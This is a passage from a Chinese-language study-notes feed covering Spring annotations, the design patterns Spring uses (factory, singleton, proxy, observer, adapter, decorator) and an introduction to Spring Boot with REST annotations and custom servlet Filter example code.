<p>@<strong>Around</strong></p>
<p>环绕通知</p>
<h2 id="属性注入" tabindex="-1"> 属性注入</h2>
<p>@<strong>Value</strong></p>
<ul>
<li>注入普通字符</li>
<li>注入操作系统属性</li>
<li>注入表达式结果</li>
<li>注入其它bean属性</li>
<li>注入文件资源</li>
<li>注入网站资源</li>
<li>注入配置文件</li>
</ul>
<h2 id="事务相关注解" tabindex="-1"> 事务相关注解</h2>
<p>@<strong>Transactional</strong></p>
<h1 id="spring-中的设计模式" tabindex="-1"> Spring 中的设计模式</h1>
<h2 id="工厂模式" tabindex="-1"> 工厂模式</h2>
<p>Spring 使用工厂模式可以通过 BeanFactory 或 ApplicationContext 创建 bean 对象。</p>
<p><strong>两者对比：</strong></p>
<ul>
<li><code>BeanFactory</code> ：延迟注入(使用到某个 bean 的时候才会注入),相比于<code>ApplicationContext</code> 来说会占用更少的内存，程序启动速度更快。</li>
<li><code>ApplicationContext</code> ：容器启动的时候，不管你用没用到，一次性创建所有 bean 。<code>BeanFactory</code> 仅提供了最基本的依赖注入支持，<code> ApplicationContext</code> 扩展了 <code>BeanFactory</code> ,除了有<code>BeanFactory</code>的功能还有额外更多功能，所以一般开发人员使用<code> ApplicationContext</code>会更多。</li>
</ul>
<p>ApplicationContext的三个实现类：</p>
<ol>
<li><code>ClassPathXmlApplication</code>：把上下文文件当成类路径资源。</li>
<li><code>FileSystemXmlApplication</code>：从文件系统中的 XML 文件载入上下文定义信息。</li>
<li><code>XmlWebApplicationContext</code>：从Web系统中的XML文件载入上下文定义信息。</li>
</ol>
<h2 id="单例模式" tabindex="-1"> 单例模式</h2>
<p>在我们的系统中，有一些对象其实我们只需要一个，比如说：线程池、缓存、对话框、注册表、日志对象、充当打印机、显卡等设备驱动程序的对象。事实上，这一类对象只能有一个实例，如果制造出多个实例就可能会导致一些问题的产生，比如：程序的行为异常、资源使用过量、或者不一致性的结果。</p>
<p><strong>Spring 中 bean 的默认作用域就是 singleton(单例)的。</strong> 除了 singleton 作用域，Spring 中 bean 还有下面几种作用域：prototype ， request ，  session ， global-session</p>
<h2 id="代理模式" tabindex="-1"> 代理模式</h2>
<h3 id="代理模式在aop中的应用" tabindex="-1"> 代理模式在AOP中的应用</h3>
<p><strong>Spring AOP 就是基于动态代理的</strong>，如果要代理的对象，实现了某个接口，那么Spring AOP会使用<strong>JDK Proxy</strong>，去创建代理对象，而对于没有实现接口的对象，就无法使用 JDK Proxy 去进行代理了，这时候Spring AOP会使用<strong>Cglib</strong> ，这时候Spring AOP会使用 <strong>Cglib</strong> 生成一个被代理对象的子类来作为代理。</p>
<h2 id="模板方法" tabindex="-1"> 模板方法</h2>
<p>模板方法模式是一种行为设计模式，它定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。 模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤的实现方式。</p>
<p>Spring 中 <code>jdbcTemplate</code>、<code>hibernateTemplate</code> 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。一般情况下，我们都是使用继承的方式来实现模板模式，但是 Spring 并没有使用这种方式，而是使用Callback 模式与模板方法模式配合，既达到了代码复用的效果，同时增加了灵活性。</p>
<h2 id="观察者模式" tabindex="-1"> 观察者模式</h2>
<p>观察者模式是一种对象行为型模式。它表示的是一种对象与对象之间具有依赖关系，当一个对象发生改变的时候，这个对象所依赖的对象也会做出反应。Spring 事件驱动模型就是观察者模式很经典的一个应用。Spring 事件驱动模型非常有用，在很多场景都可以解耦我们的代码。比如我们每次添加商品的时候都需要重新更新商品索引，这个时候就可以利用观察者模式来解决这个问题。</p>
<h3 id="spring-事件驱动模型中的三种角色" tabindex="-1"> Spring 事件驱动模型中的三种角色</h3>
<h4 id="事件角色" tabindex="-1"> 事件角色</h4>
<p><code>ApplicationEvent</code> (<code>org.springframework.context</code>包下)充当事件的角色,这是一个抽象类，它继承了<code>java.util.EventObject</code>并实现了 <code>java.io.Serializable</code>接口。</p>
<p>Spring 中默认存在以下事件，他们都是对 <code>ApplicationContextEvent</code> 的实现(继承自<code>ApplicationContextEvent</code>)：</p>
<ul>
<li><code>ContextStartedEvent</code>：<code>ApplicationContext</code> 启动后触发的事件;</li>
<li><code>ContextStoppedEvent</code>：<code>ApplicationContext</code> 停止后触发的事件;</li>
<li><code>ContextRefreshedEvent</code>：<code>ApplicationContext</code> 初始化或刷新完成后触发的事件;</li>
<li><code>ContextClosedEvent</code>：<code>ApplicationContext</code> 关闭后触发的事件。</li>
</ul>
<p><img src="@source/assets/cs-note/framework/spring/ApplicationEvent-Subclass.png" alt="ApplicationEvent-Subclass" loading="lazy"></p>
<h4 id="事件监听者角色" tabindex="-1"> 事件监听者角色</h4>
<p><code>ApplicationListener</code> 充当了事件监听者角色，它是一个接口，里面只定义了一个 <code>onApplicationEvent（）</code>方法来处理<code>ApplicationEvent</code>。<code>ApplicationListener</code>接口类源码如下，可以看出接口定义看出接口中的事件只要实现了 <code>ApplicationEvent</code>就可以了。所以，在 Spring中我们只要实现 <code>ApplicationListener</code> 接口实现 <code>onApplicationEvent()</code> 方法即可完成监听事件</p>
<div><pre><code><span>package</span> <span>org<span>.</span>springframework<span>.</span>context</span><span>;</span>
<span>import</span> <span><span>java<span>.</span>util<span>.</span></span><span>EventListener</span></span><span>;</span>
<span>@FunctionalInterface</span>
<span>public</span> <span>interface</span> <span>ApplicationListener</span><span><span>&lt;</span><span>E</span> <span>extends</span> <span>ApplicationEvent</span><span>></span></span> <span>extends</span> <span>EventListener</span> <span>{</span>
    <span>void</span> <span>onApplicationEvent</span><span>(</span><span>E</span> var1<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><h4 id="事件发布者角色" tabindex="-1"> 事件发布者角色</h4>
<p><code>ApplicationEventPublisher</code> 充当了事件的发布者，它也是一个接口。</p>
<div><pre><code><span>@FunctionalInterface</span>
<span>public</span> <span>interface</span> <span>ApplicationEventPublisher</span> <span>{</span>
    <span>default</span> <span>void</span> <span>publishEvent</span><span>(</span><span>ApplicationEvent</span> event<span>)</span> <span>{</span>
        <span>this</span><span>.</span><span>publishEvent</span><span>(</span><span>(</span><span>Object</span><span>)</span>event<span>)</span><span>;</span>
    <span>}</span>

    <span>void</span> <span>publishEvent</span><span>(</span><span>Object</span> var1<span>)</span><span>;</span>
<span>}</span>

</code></pre></div><p><code>ApplicationEventPublisher</code> 接口的<code>publishEvent（）</code>这个方法在<code>AbstractApplicationContext</code>类中被实现，阅读这个方法的实现，你会发现实际上事件真正是通过<code>ApplicationEventMulticaster</code>来广播出去的。</p>
<h3 id="spring-的事件流程总结" tabindex="-1"> Spring 的事件流程总结</h3>
<ol>
<li>定义一个事件: 实现一个继承自 <code>ApplicationEvent</code>，并且写相应的构造函数；</li>
<li>定义一个事件监听者：实现 <code>ApplicationListener</code> 接口，重写 <code>onApplicationEvent()</code> 方法；</li>
<li>使用事件发布者发布消息:  可以通过 <code>ApplicationEventPublisher  </code> 的 <code>publishEvent()</code> 方法发布消息。</li>
</ol>
<p>Example:</p>
<div><pre><code><span>// 定义一个事件,继承自ApplicationEvent并且写相应的构造函数</span>
<span>public</span> <span>class</span> <span>DemoEvent</span> <span>extends</span> <span>ApplicationEvent</span><span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>long</span> serialVersionUID <span>=</span> <span>1L</span><span>;</span>

    <span>private</span> <span>String</span> message<span>;</span>

    <span>public</span> <span>DemoEvent</span><span>(</span><span>Object</span> source<span>,</span><span>String</span> message<span>)</span><span>{</span>
        <span>super</span><span>(</span>source<span>)</span><span>;</span>
        <span>this</span><span>.</span>message <span>=</span> message<span>;</span>
    <span>}</span>

    <span>public</span> <span>String</span> <span>getMessage</span><span>(</span><span>)</span> <span>{</span>
         <span>return</span> message<span>;</span>
          <span>}</span>

    
<span>// 定义一个事件监听者,实现ApplicationListener接口，重写 onApplicationEvent() 方法；</span>
<span>@Component</span>
<span>public</span> <span>class</span> <span>DemoListener</span> <span>implements</span> <span>ApplicationListener</span><span><span>&lt;</span><span>DemoEvent</span><span>></span></span><span>{</span>

    <span>//使用onApplicationEvent接收消息</span>
    <span>@Override</span>
    <span>public</span> <span>void</span> <span>onApplicationEvent</span><span>(</span><span>DemoEvent</span> event<span>)</span> <span>{</span>
        <span>String</span> msg <span>=</span> event<span>.</span><span>getMessage</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"接收到的信息是："</span><span>+</span>msg<span>)</span><span>;</span>
    <span>}</span>

<span>}</span>
<span>// 发布事件，可以通过ApplicationEventPublisher  的 publishEvent() 方法发布消息。</span>
<span>@Component</span>
<span>public</span> <span>class</span> <span>DemoPublisher</span> <span>{</span>

    <span>@Autowired</span>
    <span>ApplicationContext</span> applicationContext<span>;</span>

    <span>public</span> <span>void</span> <span>publish</span><span>(</span><span>String</span> message<span>)</span><span>{</span>
        <span>//发布事件</span>
        applicationContext<span>.</span><span>publishEvent</span><span>(</span><span>new</span> <span>DemoEvent</span><span>(</span><span>this</span><span>,</span> message<span>)</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br></div></div><p>当调用 <code>DemoPublisher </code> 的 <code>publish()</code> 方法的时候，比如 <code>demoPublisher.publish(&quot;你好&quot;)</code> ，控制台就会打印出:<code>接收到的信息是：你好</code> 。</p>
<h2 id="适配器模式" tabindex="-1"> 适配器模式</h2>
<p>适配器模式(Adapter Pattern) 将一个接口转换成客户希望的另一个接口，适配器模式使接口不兼容的那些类可以一起工作，其别名为包装器(Wrapper)。</p>
<h3 id="spring-aop中的适配器模式" tabindex="-1"> spring AOP中的适配器模式</h3>
<p>我们知道 Spring AOP 的实现是基于代理模式，但是 Spring AOP 的增强或通知(Advice)使用到了适配器模式，与之相关的接口是<code>AdvisorAdapter </code> 。Advice 常用的类型有：<code>BeforeAdvice</code>（目标方法调用前,前置通知）、<code>AfterAdvice</code>（目标方法调用后,后置通知）、<code>AfterReturningAdvice</code>(目标方法执行结束后，return之前)等等。每个类型Advice（通知）都有对应的拦截器:<code>MethodBeforeAdviceInterceptor</code>、<code>AfterReturningAdviceAdapter</code>、<code>AfterReturningAdviceInterceptor</code>。Spring预定义的通知要通过对应的适配器，适配成 <code>MethodInterceptor</code>接口(方法拦截器)类型的对象（如：<code>MethodBeforeAdviceInterceptor</code> 负责适配 <code>MethodBeforeAdvice</code>）。</p>
<h2 id="装饰者模式" tabindex="-1"> 装饰者模式</h2>
<p>装饰者模式可以动态地给对象添加一些额外的属性或行为。相比于使用继承，装饰者模式更加灵活。简单点儿说就是当我们需要修改原有的功能，但我们又不愿直接去修改原有的代码时，设计一个Decorator套在原有代码外面。其实在 JDK 中就有很多地方用到了装饰者模式，比如 <code>InputStream</code>家族，<code>InputStream</code> 类下有 <code>FileInputStream</code> (读取文件)、<code>BufferedInputStream</code> (增加缓存,使读取文件速度大大提升)等子类都在不修改<code>InputStream</code> 代码的情况下扩展了它的功能。</p>
<p><img src="@source/assets/cs-note/framework/spring/Decorator.png" alt="装饰者模式示意图" loading="lazy"></p>
<p>Spring 中配置 DataSource 的时候，DataSource 可能是不同的数据库和数据源。我们能否根据客户的需求在少修改原有类的代码下动态切换不同的数据源？这个时候就要用到装饰者模式(这一点我自己还没太理解具体原理)。Spring 中用到的包装器模式在类名上含有 <code>Wrapper</code>或者 <code>Decorator</code>。这些类基本上都是动态地给一个对象添加一些额外的职责</p>
<h2 id="总结" tabindex="-1"> 总结</h2>
<p>Spring 框架中用到了哪些设计模式？</p>
<ul>
<li><strong>工厂设计模式</strong> : Spring使用工厂模式通过 <code>BeanFactory</code>、<code>ApplicationContext</code> 创建 bean 对象。</li>
<li><strong>代理设计模式</strong> : Spring AOP 功能的实现。</li>
<li><strong>单例设计模式</strong> : Spring 中的 Bean 默认都是单例的。</li>
<li><strong>模板方法模式</strong> : Spring 中 <code>jdbcTemplate</code>、<code>hibernateTemplate</code> 等以 Template 结尾的对数据库操作的类，它们就使用到了模板模式。</li>
<li><strong>包装器设计模式</strong> : 我们的项目需要连接多个数据库，而且不同的客户在每次访问中根据需要会去访问不同的数据库。这种模式让我们可以根据客户的需求能够动态切换不同的数据源。</li>
<li><strong>观察者模式:</strong> Spring 事件驱动模型就是观察者模式很经典的一个应用。</li>
<li><strong>适配器模式</strong> :Spring AOP 的增强或通知(Advice)使用到了适配器模式、spring MVC 中也是用到了适配器模式适配<code>Controller</code>。</li>
<li>......</li>
</ul>
<h1 id="spring-源码阅读" tabindex="-1"> Spring 源码阅读</h1>
<p>下面的是Github上的一个开源的Spring源码阅读</p>
<ul>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/Spring.md" target="_blank" rel="noopener noreferrer">spring-core</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-aop.md" target="_blank" rel="noopener noreferrer">spring-aop</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-context.md" target="_blank" rel="noopener noreferrer">spring-context</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-task.md" target="_blank" rel="noopener noreferrer">spring-task</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-transaction.md" target="_blank" rel="noopener noreferrer">spring-transaction</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/spring-mvc.md" target="_blank" rel="noopener noreferrer">spring-mvc</a></li>
<li><a href="https://github.com/seaswalker/Spring/blob/master/note/guava-cache.md" target="_blank" rel="noopener noreferrer">guava-cache</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">SpringBoot 介绍</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/SpringBoot.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/SpringBoot.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[ 
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li></li>
</ul>
 
<h1 id="springboot-介绍" tabindex="-1"> SpringBoot 介绍</h1>
<h2 id="spring-不足" tabindex="-1"> Spring 不足</h2>
<p>Spring是重量级企业开发框架 Enterprise JavaBean（EJB） 的替代品，Spring为企业级Java开发提供了一种相对简单的方法，通过 依赖注入 和 面向切面编程 ，用简单的 Java对象（Plain Old Java Object，POJO） 实现了EJB的功能</p>
<p>虽然Spring的组件代码是轻量级的，但它的配置却是重量级的（需要大量XML配置） 。Spring 2.5引入了基于注解的组件扫描，这消除了大量针对应用程序自身组件的显式XML配置。Spring 3.0引入了基于Java的配置，这是一种类型安全的可重构配置方式，可以代替XML。</p>
<p>尽管如此，我们依旧没能逃脱配置的魔爪。开启某些Spring特性时，比如事务管理和Spring MVC，还是需要用XML或Java进行显式配置。启用第三方库时也需要显式配置，比如基于Thymeleaf的Web视图。配置Servlet和过滤器（比如Spring的DispatcherServlet）同样需要在web.xml或Servlet初始化代码里进行显式配置。组件扫描减少了配置量，Java配置让它看上去简洁不少，但Spring还是需要不少配置。</p>
<h2 id="spring-boot-的引入" tabindex="-1"> Spring Boot 的引入</h2>
<p><strong>官方介绍</strong></p>
<blockquote>
<p>Spring Boot makes it easy to create stand-alone, production-grade Spring based Applications that you can “just run”...Most Spring Boot applications need very little Spring configuration.</p>
<p>Spring Boot可以轻松创建独立的生产级基于Spring的应用程序,只要通过 “just run”（可能是run ‘Application’或java -jar 或 tomcat 或 maven插件run 或 shell脚本）便可以运行项目。大部分Spring Boot项目只需要少量的配置即可)</p>
</blockquote>
<p>简而言之，从本质上来说，Spring Boot就是Spring，它做了那些没有它你自己也会去做的Spring Bean配置。</p>
<p>Spring Framework旨在简化J2EE企业应用程序开发。Spring Boot Framework旨在简化Spring开发。</p>
<h3 id="spring-boot优点" tabindex="-1"> Spring Boot优点</h3>
<ol>
<li>开发基于 Spring 的应用程序很容易。</li>
<li>Spring Boot 项目所需的开发或工程时间明显减少，通常会提高整体生产力。</li>
<li>Spring Boot不需要编写大量样板代码、XML配置和注释。</li>
<li>Spring引导应用程序可以很容易地与Spring生态系统集成，如Spring JDBC、Spring ORM、Spring Data、Spring Security等。</li>
<li>Spring Boot遵循“固执己见的默认配置”，以减少开发工作（默认配置可以修改）。</li>
<li>Spring Boot 应用程序提供嵌入式HTTP服务器，如Tomcat和Jetty，可以轻松地开发和测试web应用程序。（这点很赞！普通运行Java程序的方式就能运行基于Spring Boot web 项目，省事很多）</li>
<li>Spring Boot提供命令行接口(CLI)工具，用于开发和测试Spring Boot应用程序，如Java或Groovy。</li>
<li>Spring Boot提供了多种插件，可以使用内置工具(如Maven和Gradle)开发和测试Spring Boot应用程序。</li>
</ol>
<h2 id="spring-boot-环境要求" tabindex="-1"> Spring Boot 环境要求</h2>
<h3 id="jdk" tabindex="-1"> JDK</h3>
<p>截止到目前Spring Boot 的最新版本：2.1.8.RELEASE 要求 JDK 版本在 1.8 以上，所以确保你的电脑已经正确下载安装配置了 JDK（推荐 JDK 1.8 版本）。</p>
<h3 id="构建工具" tabindex="-1"> 构建工具</h3>
<p>构建工具(本项目涉及的代码大部分会采用 Maven 作为包管理工具):</p>
<table>
<thead>
<tr>
<th>Build Tool</th>
<th>Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Maven</td>
<td>3.3+</td>
</tr>
<tr>
<td>Gradle</td>
<td>4.4+</td>
</tr>
</tbody>
</table>
<h3 id="开发工具推荐" tabindex="-1"> 开发工具推荐</h3>
<p>推荐使用 IDEA 进行开发。最好的 Java 后台开发编辑器，没有之一！</p>
<h3 id="web-服务器" tabindex="-1"> Web 服务器</h3>
<p>Spring Boot支持以下嵌入式servlet容器:</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Servlet Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>Tomcat 9.0</td>
<td>4.0</td>
</tr>
<tr>
<td>Jetty 9.4</td>
<td>3.1</td>
</tr>
<tr>
<td>Undertow 2.0</td>
<td>4.0</td>
</tr>
</tbody>
</table>
<p>您还可以将Spring引导应用程序部署到任何Servlet 3.1+兼容的 Web 容器中。</p>
<p>这就是你为什么可以通过直接像运行 普通 Java 项目一样运行 SpringBoot 项目。这样的确省事了很多，方便了我们进行开发，降低了学习难度。</p>
<h1 id="spring-boot-开发" tabindex="-1"> Spring Boot 开发</h1>
<h2 id="restful-web-服务开发" tabindex="-1"> RESTful Web 服务开发</h2>
<h3 id="restful-web-服务介绍" tabindex="-1"> RESTful Web 服务介绍</h3>
<p>RESTful Web 服务与传统的 MVC 开发一个关键区别是返回给客户端的内容的创建方式：<strong>传统的 MVC 模式开发会直接返回给客户端一个视图，但是 RESTful Web 服务一般会将返回的数据以 JSON 的形式返回，这也就是现在所推崇的前后端分离开发。</strong></p>
<h3 id="常用注解" tabindex="-1"> 常用注解</h3>
<ol>
<li><code>@RestController</code>  **将返回的对象数据直接以 JSON 或 XML 形式写入 HTTP 响应(Response)中。**绝大部分情况下都是直接以  JSON 形式返回给客户端，很少的情况下才会以 XML 形式返回。转换成 XML 形式还需要额为的工作，上面代码中演示的直接就是将对象数据直接以 JSON 形式写入 HTTP 响应(Response)中。关于<code>@Controller</code>和<code>@RestController</code> 的对比，我会在下一篇文章中单独介绍到（<code>@Controller</code> +<code>@ResponseBody</code>= <code>@RestController</code>）。</li>
<li><code>@RequestMapping</code> :上面的示例中没有指定 GET 与 PUT、POST 等，因为**<code>@RequestMapping</code>默认映射所有HTTP Action**，你可以使用<code>@RequestMapping(method=ActionType)</code>来缩小这个映射。</li>
<li><code>@PostMapping</code>实际上就等价于 <code>@RequestMapping(method = RequestMethod.POST)</code>，同样的 <code> @DeleteMapping</code> ,<code>@GetMapping</code>也都一样，常用的 HTTP Action 都有一个这种形式的注解所对应。</li>
<li><code>@PathVariable</code> :取url地址中的参数。<code>@RequestParam </code> url的查询参数值。</li>
<li><code>@RequestBody</code>:可以<strong>将 HttpRequest body 中的 JSON 类型数据反序列化为合适的 Java 类型。</strong></li>
<li><code>ResponseEntity</code>: <strong>表示整个HTTP Response：状态码，标头和正文内容</strong>。我们可以使用它来自定义HTTP Response 的内容。</li>
</ol>
<h3 id="restcontroller-vs-controller" tabindex="-1"> @RestController vs @Controller</h3>
<p>单独使用 <code>@Controller</code> 不加 <code>@ResponseBody</code>的话一般使用在要返回一个视图的情况，这种情况属于比较传统的Spring MVC 的应用，对应于前后端不分离的情况。</p>
<p><img src="@source/assets/cs-note/framework/spring/SpringMVC传统工作流程.png" alt="SpringMVC 传统工作流程" loading="lazy"></p>
<p><code>@RestController</code>只返回对象，对象数据直接以 JSON 或 XML 形式写入 HTTP 响应(Response)中，这种情况属于 RESTful Web服务，这也是目前日常开发所接触的最常用的情况（前后端分离）。</p>
<p><img src="@source/assets/cs-note/framework/spring/SpringMVCRestController.png" alt="SpringMVC+RestController" loading="lazy"></p>
<p>如果需要在Spring4之前开发 RESTful Web服务的话，你需要使用<code>@Controller</code> 并结合<code>@ResponseBody</code>注解，也就是说<code>@Controller</code> +<code>@ResponseBody</code>= <code>@RestController</code>（Spring 4 之后新加的注解）。</p>
<blockquote>
<p><code>@ResponseBody</code> 注解的作用是将 <code>Controller</code> 的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到HTTP 响应(Response)对象的 body 中，通常用来返回 JSON 或者 XML 数据，返回 JSON 数据的情况比较多。</p>
</blockquote>
<p><img src="@source/assets/cs-note/framework/spring/Spring3.xMVCRESTfulWeb服务工作流程.png" alt="Spring3.xMVC RESTfulWeb服务工作流程" loading="lazy"></p>
<h2 id="spring-boot-filter" tabindex="-1"> Spring Boot Filter</h2>
<h3 id="filter-介绍" tabindex="-1"> Filter 介绍</h3>
<p>Filter 过滤器主要是用来过滤用户请求的，它允许我们对用户请求进行前置处理和后置处理，比如实现 URL 级别的权限控制、过滤非法请求等等。Filter 过滤器是面向切面编程——AOP 的具体实现</p>
<p>另外，Filter 是依赖于 Servlet 容器，<code>Filter</code>接口就在 Servlet 包下面，属于 Servlet 规范的一部分。所以，很多时候也称其为“增强版 Servlet”。</p>
<h3 id="filter拦截的实现机制" tabindex="-1"> Filter拦截的实现机制</h3>
<p><code>Filter</code>接口中有一个叫做 <code>doFilter</code> 的方法，这个方法实现了对用户请求的过滤。具体流程大体是这样的：</p>
<ol>
<li>用户发送请求到 web 服务器,请求会先到过滤器；</li>
<li>过滤器会对请求进行一些处理比如过滤请求的参数、修改返回给客户端的 response  的内容、判断是否让用户访问该接口等等。</li>
<li>用户请求响应完毕。</li>
<li>进行一些自己想要的其他操作。</li>
</ol>
<p><img src="@source/assets/cs-note/framework/spring/Servlet-Filter.png" alt="" loading="lazy"></p>
<h3 id="自定义filter" tabindex="-1"> 自定义Filter</h3>
<h4 id="手动注册配置实现" tabindex="-1"> 手动注册配置实现</h4>
<p><strong>自定义的 Filter 需要实现<code>javax.Servlet.Filter</code>接口，并重写接口中定义的3个方法。</strong></p>
<p><code>MyFilter.java</code></p>
<div><pre><code><span>@Component</span>
<span>public</span> <span>class</span> <span>MyFilter</span> <span>implements</span> <span>Filter</span> <span>{</span>
    <span>private</span> <span>static</span> <span>final</span> <span>Logger</span> logger <span>=</span> <span>LoggerFactory</span><span>.</span><span>getLogger</span><span>(</span><span>MyFilter</span><span>.</span><span>class</span><span>)</span><span>;</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>init</span><span>(</span><span>FilterConfig</span> filterConfig<span>)</span> <span>{</span>
        logger<span>.</span><span>info</span><span>(</span><span>"初始化过滤器："</span><span>,</span> filterConfig<span>.</span><span>getFilterName</span><span>(</span><span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>doFilter</span><span>(</span><span>ServletRequest</span> servletRequest<span>,</span> <span>ServletResponse</span> servletResponse<span>,</span> <span>FilterChain</span> filterChain<span>)</span> <span>throws</span> <span>IOException</span><span>,</span> <span>ServletException</span> <span>{</span>
        <span>//对请求进行预处理</span>
        logger<span>.</span><span>info</span><span>(</span><span>"过滤器开始对请求进行预处理："</span><span>)</span><span>;</span>
        <span>HttpServletRequest</span> request <span>=</span> <span>(</span><span>HttpServletRequest</span><span>)</span> servletRequest<span>;</span>
        <span>String</span> requestUri <span>=</span> request<span>.</span><span>getRequestURI</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"请求的接口为："</span> <span>+</span> requestUri<span>)</span><span>;</span>
        <span>long</span> startTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>//通过 doFilter 方法实现过滤功能</span>
        filterChain<span>.</span><span>doFilter</span><span>(</span>servletRequest<span>,</span> servletResponse<span>)</span><span>;</span>
        <span>// 上面的 doFilter 方法执行结束后用户的请求已经返回</span>
        <span>long</span> endTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"该用户的请求已经处理完毕，请求花费的时间为："</span> <span>+</span> <span>(</span>endTime <span>-</span> startTime<span>)</span><span>)</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>destroy</span><span>(</span><span>)</span> <span>{</span>
        logger<span>.</span><span>info</span><span>(</span><span>"销毁过滤器"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><p><code>MyFilterConfig.java</code></p>
<p><strong>在配置中注册自定义的过滤器。</strong></p>
<div><pre><code><span>@Configuration</span>
<span>public</span> <span>class</span> <span>MyFilterConfig</span> <span>{</span>
    <span>@Autowired</span>
    <span>MyFilter</span> myFilter<span>;</span>
    <span>@Bean</span>
    <span>public</span> <span>FilterRegistrationBean</span><span><span>&lt;</span><span>MyFilter</span><span>></span></span> <span>thirdFilter</span><span>(</span><span>)</span> <span>{</span>
        <span>FilterRegistrationBean</span><span><span>&lt;</span><span>MyFilter</span><span>></span></span> filterRegistrationBean <span>=</span> <span>new</span> <span>FilterRegistrationBean</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

        filterRegistrationBean<span>.</span><span>setFilter</span><span>(</span>myFilter<span>)</span><span>;</span>

        filterRegistrationBean<span>.</span><span>setUrlPatterns</span><span>(</span><span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>Arrays</span><span>.</span><span>asList</span><span>(</span><span>"/api/*"</span><span>)</span><span>)</span><span>)</span><span>;</span>

        <span>return</span> filterRegistrationBean<span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><h4 id="注解实现" tabindex="-1"> 注解实现</h4>
<p><strong>在自己的过滤器的类上加上<code>@WebFilter</code> 然后在这个注解中通过它提供好的一些参数进行配置。</strong></p>
<div><pre><code><span>@WebFilter</span><span>(</span>filterName <span>=</span> <span>"MyFilterWithAnnotation"</span><span>,</span> urlPatterns <span>=</span> <span>"/api/*"</span><span>)</span>
<span>public</span> <span>class</span> <span>MyFilterWithAnnotation</span> <span>implements</span> <span>Filter</span> <span>{</span>

   <span>.</span><span>.</span><span>.</span><span>.</span><span>.</span><span>.</span>
<span>}</span>
</code></pre></div><h3 id="多个filter顺序" tabindex="-1"> 多个Filter顺序</h3>
<p><strong>在配置中注册自定义的过滤器，通过<code>FilterRegistrationBean</code> 的<code>setOrder</code> 方法可以决定 Filter 的执行顺序。</strong></p>
<h2 id="spring-boot-interceptor" tabindex="-1"> Spring Boot Interceptor</h2>
